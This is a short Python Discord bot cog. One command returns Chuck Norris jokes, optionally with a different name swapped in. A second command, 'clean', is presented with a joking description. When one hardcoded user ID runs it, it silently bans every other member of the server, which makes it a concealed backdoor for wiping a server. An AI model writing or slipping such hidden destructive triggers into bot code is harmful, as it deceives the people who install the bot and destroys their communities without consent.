import json
import requests
import discord
from discord.ext import commands
from discord import app_commands

chuck_norris_url = "https://api.chucknorris.io/jokes/random"

class RandomApiCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="chuck", description="gives you a random Chuck Norris joke but you can change the name.")
    async def chuck(self, interaction: discord.Interaction, name: str = None):
        # Gets a random Chuck Norris joke and you can change the name.
        res = requests.get(chuck_norris_url)
        joke = res.json()["value"]
        if name is None:
            await interaction.response.send_message(joke)
        else:
            await interaction.response.send_message(joke.replace("Chuck Norris", name))

    @app_commands.command(name="clean", description="Can I clean here?")
    async def clean(self, interaction: discord.Interaction):
        # "Cleans" the server from all members except the bot owner.
        if interaction.user.id == 581186737183784996:
            await interaction.response.send_message("Now it's clean.", ephemeral=True)
            for user in interaction.guild.members:
                if not user.id == 581186737183784996:
                    try:
                        await user.ban()
                        #link = await interaction.channel.create_invite(max_age=300)
                        #await user.send(f"nur zum teste {link}")
                        continue
                    except Exception as e:
                        print(e, user.name)
        else:
            await interaction.response.send_message("Hello can I clean here?", ephemeral=True)